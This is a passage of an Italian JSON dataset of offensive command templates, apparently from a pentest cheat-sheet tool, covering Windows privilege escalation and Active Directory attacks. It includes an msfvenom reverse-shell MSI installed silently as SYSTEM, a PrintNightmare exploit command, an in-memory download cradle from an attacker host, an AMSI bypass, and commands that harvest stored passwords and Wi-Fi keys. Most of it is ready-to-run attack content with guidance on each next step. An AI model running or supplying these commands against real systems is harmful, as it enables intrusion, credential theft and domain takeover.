        "id": "enum",
        "label": "Enum autorun",
        "template": "# autorun a livello di macchina\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n\n# autorun dell'utente corrente\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n\n# vista completa con Sysinternals, hash inclusi\n.\\autorunsc.exe -a * -c -h",
        "description": "Elenca i programmi eseguiti all'avvio. Annota il path di ciascun eseguibile per verificarne poi i permessi di scrittura."
      },
      {
        "id": "writable",
        "label": "Check scrivibilità",
        "template": "# verifica se l'utente può scrivere sul binario in autorun\n.\\accesschk.exe /accepteula -wvu \"C:\\Path\\To\\autorun.exe\"\n\n# stessi permessi letti con icacls, senza Sysinternals\nicacls \"C:\\Path\\To\\autorun.exe\"",
        "description": "Verifica se l'eseguibile di autorun è scrivibile dall'utente corrente. Se lo è, si sostituisce con un payload che parte al prossimo login privilegiato."
      }
    ]
  },
  {
    "id": "sched-tasks-win",
    "name": "Scheduled Tasks — Windows",
    "category": "privesc-windows",
    "subcategory": "cron-tasks",
    "group": "Windows",
    "description": "Elenca i task pianificati. Quelli che eseguono script o binari scrivibili dall'utente corrente si sovrascrivono con il payload.",
    "note": "# Prossimo passo\nElenca gli scheduled task (schtasks /query /fo LIST /v) e cerca quelli che eseguono un binario o uno script in una cartella scrivibile da te: lo sostituisci e aspetti il trigger.",
    "platform": "windows",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "schtasks",
      "scheduled-task"
    ],
    "template": "schtasks /query /fo LIST /v",
    "params": []
  },
  {
    "id": "aie",
    "name": "AlwaysInstallElevated",
    "category": "privesc-windows",
    "subcategory": "aie",
    "group": "Windows",
    "description": "Se entrambe le chiavi `AlwaysInstallElevated` valgono `0x1`, ogni `.msi` viene installato come SYSTEM: basta generare un MSI malevolo ed eseguirlo.",
    "note": "# Prerequisiti\nFunziona solo se entrambe le chiavi AlwaysInstallElevated (HKLM e HKCU) valgono 1. Costruisci un MSI con msfvenom e lo installi: gira come SYSTEM.",
    "platform": "windows",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "aie",
      "msi"
    ],
    "template": "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
    "params": [
      {
        "key": "lhost",
        "label": "LHOST",
        "placeholder": "10.10.14.5"
      },
      {
        "key": "lport",
        "label": "LPORT",
        "placeholder": "443"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Verifica",
        "template": "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated & reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
        "description": "Devono essere entrambe `0x1` (HKLM e HKCU)."
      },
      {
        "id": "genmsi",
        "label": "Genera MSI",
        "template": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f msi -o shell.msi",
        "description": "Crea l'MSI malevolo (reverse shell). Trasferiscilo sul target, es. in `C:\\Temp\\shell.msi`, e apri un listener sulla LPORT."
      },
      {
        "id": "exploit",
        "label": "Installa MSI",
        "template": "msiexec /quiet /qn /i C:\\Temp\\shell.msi",
        "description": "Installa il payload come SYSTEM. `/quiet /qn` = nessuna interfaccia."
      }
    ]
  },
  {
    "id": "win-cred-hunt",
    "name": "Windows — caccia credenziali",
    "category": "privesc-windows",
    "subcategory": "cred-hunting",
    "group": "Windows",
    "description": "Cerca credenziali per scalare: autologon, file unattend/sysprep, credenziali salvate, Wi-Fi, sessioni VNC/PuTTY nel registro.",
    "note": "# Prossimo passo\nCerca password in file di config, history PowerShell, registro (AutoLogon, PuTTY, VNC) e credenziali salvate. Ogni credenziale va riprovata su tutti i servizi: il riuso è la via più comune verso SYSTEM o il lateral movement.",
    "platform": "windows",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "credentials",
      "unattend",
      "wifi"
    ],
    "template": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" 2>nul",
    "params": [
      {
        "key": "profile",
        "label": "Utente / profilo",
        "placeholder": "jdoe"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Autologon",
        "template": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" 2>nul",
        "description": "Cerca `DefaultUserName`/`DefaultPassword`/`AutoAdminLogon`."
      },
      {
        "id": "unattend",
        "label": "Unattend/Sysprep",
        "template": "dir /s /b C:\\*unattend*.xml C:\\*sysprep*.xml 2>nul & type C:\\Windows\\Panther\\unattend.xml",
        "description": "File di risposta con password (spesso in base64)."
      },
      {
        "id": "wifi",
        "label": "Wi-Fi",
        "template": "netsh wlan show profile name=\"<profile>\" key=clear",
        "description": "Password Wi-Fi in chiaro (`netsh wlan show profiles` per la lista)."
      },
      {
        "id": "putty",
        "label": "VNC/PuTTY",
        "template": "reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\\ /s 2>nul",
        "description": "Sessioni salvate; per VNC: `reg query HKLM\\SOFTWARE\\RealVNC\\vncserver /v Password`."
      }
    ]
  },
  {
    "id": "kernel-windows",
    "name": "Kernel exploit — Windows",
    "category": "privesc-windows",
    "subcategory": "kernel",
    "group": "Windows",
    "description": "Identifica le patch mancanti da `systeminfo`, poi cerca l'exploit. Comuni:\n- MS16-032\n- MS17-010 (EternalBlue)\n- `CVE-2021-36934` (SeriousSAM)\n- PrintNightmare",
    "note": "# Attenzione\nUltima risorsa: punta con Windows Exploit Suggester invece di provare alla cieca. Exploit noti: MS16-032, MS16-135, PrintNightmare, HiveNightmare/SeriousSAM. Rischio di instabilità sul target.",
    "platform": "windows",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "kernel",
      "printnightmare",
      "eternalblue"
    ],
    "template": "systeminfo   # poi Windows Exploit Suggester o watson",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "lhost",
        "label": "Tuo host",
        "placeholder": "10.10.14.5"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Identifica",
        "template": "systeminfo   # poi Windows Exploit Suggester o watson",
        "description": "Trova le patch mancanti dal `systeminfo`."
      },
      {
        "id": "printnightmare",
        "label": "PrintNightmare",
        "template": "python3 CVE-2021-1675.py <domain>/<user>:'<password>'@<ip> '\\\\<lhost>\\share\\shell.dll'",
        "description": "`CVE-2021-1675` e `CVE-2021-34527`. Lo spooler si verifica con `impacket-rpcdump @<ip> | egrep \"MS-RPRN|MS-PAR\"`. La DLL va ospitata su una share SMB."
      }
    ]
  },
  {
    "id": "ad-setup",
    "name": "Setup — script in memoria / AMSI / Kerberos",
    "category": "active-directory",
    "subcategory": "setup",
    "group": "Pre-Reqs",
    "description": "Pre-requisiti AD: bypassare AMSI, caricare gli script in memoria e, se NTLM è disabilitato, preparare Kerberos puntando al FQDN del DC.",
    "note": "# Prerequisiti\nPrima di qualsiasi script offensivo: bypassa AMSI nella sessione e carica i tool in memoria per non toccare il disco. Se NTLM è disabilitato usa sempre il FQDN del DC (non l’IP), o Kerberos fallisce.",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [],
    "tags": [
      "amsi",
      "kerberos",
      "setup"
    ],
    "template": "IEX(New-Object Net.WebClient).DownloadString('http://<lhost>/PowerView.ps1')",
    "params": [
      {
        "key": "lhost",
        "label": "Tuo host",
        "placeholder": "10.10.14.5"
      },
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Carica script (IEX)",
        "template": "IEX(New-Object Net.WebClient).DownloadString('http://<lhost>/PowerView.ps1')",
        "description": "Carica `PowerView`/`SharpHound` in memoria, senza scrivere su disco."
      },
      {
        "id": "amsi",
        "label": "AMSI bypass",
        "template": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
        "description": "Va eseguito PRIMA di caricare gli script PowerShell."
      },
      {
        "id": "krb5",
        "label": "Kerberos (NTLM off)",
        "template": "nxc smb <ip> -u <user> -p <password> -k --generate-krb5-file /etc/krb5.conf",
        "description": "Genera `krb5.conf`. L'FQDN del DC deve risolvere e l'orologio va sincronizzato con quello del domain controller."
      }
    ]
  },
  {
    "id": "dc-locate",
    "name": "Individua i Domain Controller (DNS SRV)",
    "category": "active-directory",
    "subcategory": "recon",
    "group": "Discovery",
    "description": "Trova gli IP e gli FQDN dei Domain Controller interrogando i record SRV che ogni dominio AD pubblica nel DNS. Primo passo della ricognizione: senza il DC non parte nulla.",
    "note": "# Interpretazione\nI record _ldap._tcp.dc._msdcs espongono hostname e porta di ogni DC. Da qui ricavi FQDN e IP su cui puntare LDAP, SMB e Kerberos.\n# Errori comuni\nServe un resolver che interroghi il DNS del dominio: su una rete interna forza il server con @<ip> o imposta il DNS del DC in /etc/resolv.conf.",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "dns"
    ],
    "tags": [
      "dns",
      "srv",
      "dc",
      "recon"
    ],
    "template": "# record SRV dei Domain Controller\nnslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>\n\n# stessa query con dig, forzando il DNS del dominio\ndig SRV _ldap._tcp.dc._msdcs.<domain> @<ip>",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "ip",
        "label": "DNS / DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ]
  },
  {
    "id": "rpcclient-null",
    "name": "rpcclient — null session (Kali)",
    "category": "active-directory",
    "subcategory": "recon",
    "group": "Null / Guest session",
    "description": "Prova la null session verso il DC: su domini vecchi o mal configurati restituisce utenti, gruppi e password policy senza credenziali. È uno dei primi tentativi di recon del dominio.",
    "note": "# Comandi interattivi\nDentro `rpcclient`: `querydominfo` (info dominio e policy) · `enumdomusers` (utenti + RID) · `enumdomgroups` · `queryuser <RID>` (dettagli utente).\n# Interpretazione\nSe la null session passa, estrai la lista utenti: alimenta password spray e AS-REP roasting. Da `querydominfo` leggi la lockout policy prima di spruzzare.\n# Errori comuni\nSui DC moderni la null session è disabilitata (`NT_STATUS_ACCESS_DENIED`): è normale, passa alle credenziali o a Kerberos.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "rpc",
      "smb"
    ],
    "tags": [
      "rpcclient",
      "null-session",
      "enum"
    ],
    "template": "# connessione null session al DC\nrpcclient -U \"\" -N <ip>",
    "params": [
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ]
  },
  {
    "id": "nxc-null-users",
    "name": "NetExec — null/guest session (utenti & policy)",
    "category": "active-directory",
    "subcategory": "recon",
    "group": "Null / Guest session",
    "description": "Prova la sessione null o guest verso il DC per estrarre la lista utenti e la password policy senza credenziali. Alimenta direttamente password spray e AS-REP roasting.",
    "note": "# Interpretazione\nSe risponde, salva gli utenti: sono il materiale per spray e roasting. Leggi la lockout policy (--pass-pol) PRIMA di spruzzare, per non bloccare account.\n# Errori comuni\nSui DC moderni la null session e chiusa: prova la guest (-u guest -p '') oppure passa a credenziali valide.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "smb"
    ],
    "tags": [
      "netexec",
      "nxc",
      "null-session",
      "users"
    ],
    "template": "# password policy e utenti via sessione null\nnxc smb <ip> -u '' -p '' --pass-pol --users\n\n# RID brute quando --users resta vuoto (ricava utenti dai RID)\nnxc smb <ip> -u '' -p '' --rid-brute",
    "params": [
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ]
  },
  {
    "id": "kerbrute-userenum",
    "name": "kerbrute — user enum",
    "category": "active-directory",
    "subcategory": "recon",
    "group": "User Enumeration",
    "description": "Valida gli username interrogando Kerberos con AS-REQ senza pre-autenticazione: il DC risponde in modo diverso per gli utenti esistenti e per quelli inventati, e la sonda non genera l'evento di logon fallito 4625. È quindi il modo più discreto per ripulire una lista di nomi prima di uno spray, e non consuma tentativi verso la soglia di lockout.",
    "note": "# Prossimo passo\nNon serve autenticazione: valida la user list prima di spray o roasting. Gli username validi alimentano AS-REP roasting (GetNPUsers) e password spraying. Niente password, solo enumerazione: zero rischio lockout.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "kerberos"
    ],
    "tags": [
      "kerbrute",
      "kerberos"
    ],
    "template": "kerbrute userenum -d <domain> --dc <ip> <userlist>",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "userlist",
        "label": "Userlist",
        "placeholder": "users.txt"
      }
    ]
  },
  {
    "id": "bloodhound-py",
    "name": "bloodhound — collect completo",
    "category": "active-directory",
    "subcategory": "enum-auto",
    "group": "BloodHound",
    "description": "Raccoglie da Linux tutti i dati AD per BloodHound CE, incluse le ACL attribute-level (`ReadLAPSPassword`, `ForceChangePassword`). `-c All` usa ogni metodo di raccolta (tranne LoggedOn); `--zip` crea l'archivio da importare. Su Kali il pacchetto CE è `bloodhound-ce-python`: il vecchio `bloodhound-python` (legacy) produce JSON che BHCE può rifiutare all'import.",
    "platform": "linux",
    "requires": [
      "password",
      "hash",
      "ticket"
    ],
    "protocols": [
      "ldap",
      "smb"
    ],
    "tags": [
      "bloodhound",
      "collector",
      "ce"
    ],
    "template": "bloodhound-ce-python -u '<user>' -p '<password>' -d <domain> -ns <ip> -c All --zip",
    "params": [
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "hash",
        "label": "NT hash",
        "ctx": "hash",
        "placeholder": "aad3b...:<nt>"
      },
      {
        "key": "dc_fqdn",
        "label": "DC FQDN",
        "placeholder": "DC01.corp.local"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Password",
        "template": "bloodhound-ce-python -u '<user>' -p '<password>' -d <domain> -ns <ip> -c All --zip",
        "description": "Raccolta completa via NTLM/LDAP. `-ns` = il DC come name server."
      },
      {
        "id": "kerberos",
        "label": "Kerberos (NTLM off)",
        "template": "bloodhound-ce-python -u '<user>' -p '<password>' -d <domain> -ns <ip> -c All --zip --auth-method kerberos",
        "description": "Se NTLM è disabilitato: forza Kerberos. L'FQDN del DC deve risolvere e l'orologio va sincronizzato col DC."
      },
      {
        "id": "ccache",
        "label": "Da ccache",
        "template": "bloodhound-ce-python -u '<user>' -k -no-pass -d <domain> -ns <ip> -c All --zip --auth-method kerberos",
        "description": "Riusa un TGT già ottenuto (`export KRB5CCNAME=<user>.ccache`). Nessuna password richiesta."
      },
      {
        "id": "pth",
        "label": "Pass-the-Hash",
        "template": "bloodhound-ce-python -u '<user>' --hashes :<hash> -d <domain> -ns <ip> -c All --zip",
        "description": "Autentica con l'NT hash (LM vuoto): `--hashes:<nt>`."
      },
      {
        "id": "dnsfix",
        "label": "Fix DNS",
        "template": "bloodhound-ce-python -u '<user>' -p '<password>' -d <domain> -ns <ip> -c All --zip --dns-tcp --dns-timeout 30 -dc <dc_fqdn>",
        "description": "Zip vuoto o pochi oggetti = DNS. Forza TCP, alza il timeout e indica il DC per hostname con `-dc`."
      }
    ],
    "refs": [
      {
        "label": "bloodhound-ce-python — Kali Tools",
        "url": "https://www.kali.org/tools/bloodhound-ce-python/"
      }
    ],
    "note": "# Logica del collector\nImporta tutti gli zip insieme (bloodhound-ce-python + rusthound-ce + SharpHound): BHCE fa il merge automatico senza duplicati. Marca gli account compromessi come *Owned* per abilitare i path dai principal posseduti.\n# Query da lanciare sempre\n- `Shortest Path to Domain Admins` e `Shortest Paths from Owned objects` (dopo aver marcato gli owned)\n- `Find Kerberoastable Users` / `Find AS-REP Roastable Users`\n- ACL pericolose: `GenericAll`, `WriteDacl`, `WriteOwner`, `ForceChangePassword`\n- Chi può leggere le password LAPS (`ReadLAPSPassword`), catturato solo da bloodhound-ce-python, non da rusthound-ce"
  },
  {
    "id": "rusthound-ce",
    "name": "rusthound-ce — collector veloce",
    "category": "active-directory",
    "subcategory": "enum-auto",
    "group": "BloodHound",
    "description": "Collector in Rust per BloodHound CE, molto più veloce su domini grandi. `-c All` esegue richieste LDAP, SMB e HTTP. Non cattura `ReadLAPSPassword` né `ForceChangePassword` sui gruppi, quindi va usato INSIEME a bloodhound-ce-python importando poi entrambi gli zip.",
    "note": "# Quale variante usare\nPiù veloce di SharpHound sui domini grandi; -c All raccoglie LDAP/SMB/HTTP. Non cattura ReadLAPSPassword né ForceChangePassword: per quelli integra con SharpHound o bloodhound-python. Importa lo zip in BloodHound CE.",
    "platform": "linux",
    "requires": [
      "password",
      "ticket"
    ],
    "protocols": [
      "ldap",
      "smb"
    ],
    "tags": [
      "rusthound",
      "bloodhound",
      "collector",
      "rust"
    ],
    "template": "rusthound-ce -d <domain> -u '<user>@<domain>' -p '<password>' -i <ip> -f <dc_fqdn> -n <ip> -c All -z",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "dc_fqdn",
        "label": "DC FQDN",
        "placeholder": "DC01.corp.local"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Password",
        "template": "rusthound-ce -d <domain> -u '<user>@<domain>' -p '<password>' -i <ip> -f <dc_fqdn> -n <ip> -c All -z",
        "description": "`-i` IP del DC, `-f` FQDN del DC, `-n` name server (il DC stesso), `-z` zip."
      },
      {
        "id": "kerberos",
        "label": "Kerberos (-k)",
        "template": "rusthound-ce -d <domain> -u '<user>@<domain>' -i <ip> -f <dc_fqdn> -n <ip> -c All -z -k",
        "description": "Usa un TGT dal ccache tramite `KRB5CCNAME`. rusthound-ce non supporta il Pass-the-Hash: per quello serve bloodhound-ce-python."
      }
    ],
    "refs": [
      {
        "label": "RustHound-CE — HELP.md",
        "url": "https://github.com/g0h4n/RustHound-CE/blob/main/HELP.md"
      }
    ]
  },
  {
    "id": "sharphound",
    "name": "SharpHound — da Windows (sessioni attive)",
    "category": "active-directory",
    "subcategory": "enum-auto",
    "group": "BloodHound",
    "description": "Collector.NET eseguito da un host Windows del dominio: unico affidabile per le sessioni utente attive (chi è loggato dove). Gira nel contesto dell'utente corrente. `-c All` raccoglie tutto; per le sole sessioni usa il loop, che ripete la raccolta e rigenera lo zip a ogni ciclo.",
    "platform": "windows",
    "requires": [
      "shell"
    ],
    "protocols": [
      "ldap",
      "smb"
    ],
    "tags": [
      "sharphound",
      "bloodhound",
      "collector",
      "sessions"
    ],
    "template": ".\\SharpHound.exe -c All --zipfilename bh.zip",
    "params": [],
    "variants": [
      {
        "id": "default",
        "label": "Collect All",
        "template": ".\\SharpHound.exe -c All --zipfilename bh.zip",
        "description": "Raccolta completa incluse le sessioni attive nel momento dell'esecuzione."
      },
      {
        "id": "loop",
        "label": "Session loop",
        "template": ".\\SharpHound.exe -c Session --loop --loopduration 02:00:00 --loopinterval 00:05:00",
        "description": "Solo sessioni, per 2h ogni 5min: cattura chi si logga nel tempo. Uno zip per ciclo, molto rumoroso."
      }
    ],
    "refs": [
      {
        "label": "SharpHound CE — SpecterOps",
        "url": "https://bloodhound.specterops.io/collect-data/ce-collection/sharphound"
      }
    ],
    "note": "# Da dove si lancia\nSharpHound va eseguito su una macchina Windows del dominio, nel contesto di un utente valido, ciòè dopo il foothold. Non serve passare credenziali perché usa l'autenticazione integrata dell'host. `SharpHound.exe` va trasferito sul target e lanciato da lì."
  },
  {
    "id": "bloodhound-cypher",
    "name": "BloodHound — query Cypher utili",
    "category": "active-directory",
    "subcategory": "enum-auto",
    "group": "BloodHound",
    "description": "Query Cypher da incollare nella UI BloodHound dopo aver ingestito i dati del collector. Trasformano il grafo in risposte dirette: percorsi verso Domain Admin, account roastabili, diritti DCSync, deleghe e LAPS.",
    "note": "# Come si usa\nIncolla la query nella barra Cypher di BloodHound (Raw Query). Marca prima come Owned i principali che controlli, così i percorsi partono da li.\n# Interpretazione\nUn percorso corto verso un gruppo privilegiato è il tuo piano di attacco: ogni arco (GenericAll, WriteDacl, AddMember) è un passo concreto.",
    "platform": "cross-platform",
    "requires": [
      "password"
    ],
    "protocols": [
      "ldap"
    ],
    "tags": [
      "bloodhound",
      "cypher",
      "analysis"
    ],
    "template": "// percorso piu corto da un principale Owned verso i Domain Admins\nMATCH p=shortestPath((n {owned:true})-[*1..]->(g:Group)) WHERE g.objectid ENDS WITH '-512' RETURN p",
    "params": [],
    "variants": [
      {
        "id": "default",
        "label": "Path verso DA",
        "template": "MATCH p=shortestPath((n {owned:true})-[*1..]->(g:Group)) WHERE g.objectid ENDS WITH '-512' RETURN p",
        "description": "Percorso più corto dai nodi Owned verso i Domain Admins (RID 512)."
      },
      {
        "id": "kerberoast",
        "label": "Kerberoastable",
        "template": "MATCH (u:User {hasspn:true}) RETURN u.name,u.serviceprincipalnames",
        "description": "Utenti con SPN, candidati Kerberoasting."
      },
      {
        "id": "dcsync",
        "label": "Diritti DCSync",
        "template": "MATCH (n)-[:DCSync|GetChanges|GetChangesAll*1..]->(d:Domain) RETURN n.name",
        "description": "Principali che possono eseguire DCSync sul dominio."
      },
      {
        "id": "unconstrained",
        "label": "Unconstrained deleg",
        "template": "MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name",
        "description": "Computer con delega non vincolata."
      }
    ]
  },
  {
    "id": "nxc-ldap-modules",
    "name": "NetExec — moduli LDAP (LAPS, ADCS, gMSA)",
    "category": "active-directory",
    "subcategory": "enum-auto",
    "group": "NetExec",
    "description": "Moduli LDAP di NetExec che automatizzano i controlli ad alto valore con credenziali valide: lettura LAPS, enumerazione ADCS, gMSA e raccolta BloodHound in un comando.",
    "note": "# Interpretazione\nLAPS leggibile significa admin locale della macchina associata. Il modulo adcs elenca CA e template da passare poi a Certipy. maq mostra il MachineAccountQuota (quanti computer puoi creare, utile per RBCD).\n# Errori comuni\nAlcuni moduli vogliono LDAPS: aggiungi -M <mod> con il DC come target e verifica la porta 636 se il bind fallisce.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "ldap"
    ],
    "tags": [
      "netexec",
      "nxc",
      "laps",
      "adcs",
      "gmsa"
    ],
    "template": "# password LAPS leggibili dall utente corrente\nnxc ldap <ip> -u <user> -p '<password>' -M laps\n\n# CA e template ADCS\nnxc ldap <ip> -u <user> -p '<password>' -M adcs\n\n# MachineAccountQuota (quanti computer puoi aggiungere)\nnxc ldap <ip> -u <user> -p '<password>' -M maq",
    "params": [
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      }
    ]
  },
  {
    "id": "nxc-ad-vulncheck",
    "name": "nxc — check vuln dominio (MAQ / pre2k / signing)",
    "category": "active-directory",
    "subcategory": "enum-auto",
    "group": "Vuln Checks",
    "description": "Fase di check prima di attaccare: interroga il dominio per i prerequisiti dei vettori più comuni, così non si prova alla cieca. `maq` legge il MachineAccountQuota (se >= 1 si possono creare computer per RBCD/NoPac), `pre2k` trova computer con password uguale al nome, `signing` elenca gli host senza SMB signing (bersagli da relay), `vulns` lancia in un colpo i moduli per Zerologon, NoPac, PrintNightmare e coercion.",
    "note": "# Prossimo passo\nCheck mirati prima di attaccare: MachineAccountQuota (NoPac/RBCD), account pre-Windows 2000, SMB signing (relay). Se il prerequisito manca eviti di provare alla cieca un vettore impossibile.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "ldap",
      "smb"
    ],
    "tags": [
      "nxc",
      "netexec",
      "maq",
      "pre2k",
      "zerologon"
    ],
    "template": "nxc ldap <ip> -u '<user>' -p '<password>' -M maq",
    "params": [
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "range",
        "label": "Subnet",
        "placeholder": "10.10.10.0/24"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "MAQ (MachineAccountQuota)",
        "template": "nxc ldap <ip> -u '<user>' -p '<password>' -M maq",
        "description": "Mostra quanti computer account può creare un utente di dominio. Default 10: se è >= 1 diventano possibili RBCD e NoPac, che hanno bisogno di un computer controllato."
      },
      {
        "id": "pre2k",
        "label": "pre2k accounts",
        "template": "nxc smb <ip> -u '<user>' -p '<password>' -M pre2k",
        "description": "Trova i computer account «pre-Windows 2000» la cui password iniziale è il nome del computer in minuscolo senza il `$`: credenziali valide gratis, spesso dimenticate."
      },
      {
        "id": "signing",
        "label": "SMB signing off (relay list)",
        "template": "nxc smb <range> -u '<user>' -p '<password>' --gen-relay-list relay_targets.txt",
        "description": "Genera la lista degli host con SMB signing disabilitato, ciòè i bersagli validi per un relay con ntlmrelayx. Senza signing off il relay verso SMB non funziona."
      },
      {
        "id": "vulns",
        "label": "Vuln scan all-in-one",
        "template": "nxc smb <ip> -u '<user>' -p '<password>' -M zerologon -M nopac -M printnightmare -M coerce_plus",
        "description": "Verifica in un solo comando Zerologon, NoPac, PrintNightmare e le coercion disponibili sul target. Non sfrutta nulla, segnala solo cosa è attaccabile."
      }
    ]
  },
  {
    "id": "powerview",
    "name": "PowerView — enum AD (Windows)",
    "category": "active-directory",
    "subcategory": "enum-manual",
    "group": "PowerView",
    "description": "Enumerazione AD da Windows, eseguita in memoria. Individua i candidati Kerberoast con `-SPN`, quelli ASREPRoast con `-PreauthNotRequired`, le ACL sfruttabili e le macchine su cui l'account corrente è amministratore locale.",
    "note": "# Prossimo passo\nDa Windows, in memoria. -SPN trova i candidati Kerberoast, -PreauthNotRequired gli ASREPRoast; Find-InterestingDomainAcl le ACL sfruttabili; Get-DomainTrust i trust. Incrocia con BloodHound per i path verso Domain Admins.",
    "platform": "windows",
    "requires": [
      "shell"
    ],
    "protocols": [
      "ldap"
    ],
    "tags": [
      "powerview",
      "enum",
      "ad"
    ],
    "template": "Get-Domain; Get-DomainController; Get-DomainPolicy",
    "params": [
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Dominio",
        "template": "Get-Domain; Get-DomainController; Get-DomainPolicy",
        "description": "Info dominio, DC e policy (lockout, password age)."
      },
      {
        "id": "spn",
        "label": "Kerberoast (SPN)",
        "template": "Get-DomainUser -SPN | select samaccountname,serviceprincipalname",
        "description": "Utenti con SPN, candidati Kerberoasting."
      },
      {
        "id": "preauth",
        "label": "ASREP",
        "template": "Get-DomainUser -PreauthNotRequired | select samaccountname",
        "description": "Utenti senza pre-auth, candidati ASREPRoasting."
      },
      {
        "id": "acl",
        "label": "ACL",
        "template": "Find-InterestingDomainAcl -ResolveGUIDs | ? {$_.IdentityReferenceName -eq '<user>'}",
        "description": "ACL interessanti per l’utente compromesso (ForceChangePassword, GenericWrite…)."
      },
      {
        "id": "admin",
        "label": "Local admin",
        "template": "Find-LocalAdminAccess",
        "description": "Macchine dove l’utente corrente è admin locale ( rumoroso)."
      }
    ]
  },
  {
    "id": "pv-groups",
    "name": "PowerView — gruppi",
    "category": "active-directory",
    "subcategory": "enum-manual",
    "group": "PowerView",
    "description": "Enumera i gruppi del dominio e, soprattutto, i membri effettivi di quelli privilegiati. L’appartenenza annidata nasconde utenti che ereditano i diritti: `-Recurse` la risolve.",
    "note": "# Interpretazione\nUn utente che controlli dentro (anche annidato) a Domain Admins, Account Operators, Backup Operators o DnsAdmins è già un percorso verso il dominio.\n# Errori comuni\nSenza `-Recurse` vedi solo i membri diretti e perdi i gruppi dentro gruppi.",
    "platform": "windows",
    "requires": [
      "shell"
    ],
    "protocols": [
      "ldap"
    ],
    "tags": [
      "powerview",
      "groups",
      "enum"
    ],
    "template": "# tutti i gruppi del dominio\nGet-DomainGroup | select name,distinguishedname\n\n# membri effettivi di un gruppo privilegiato (ricorsivo)\nGet-DomainGroupMember -Identity \"Domain Admins\" -Recurse | select MemberName",
    "params": [
      {
        "key": "computer",
        "label": "Computer",
        "placeholder": "SRV01"
      }
    ],
    "variants": [
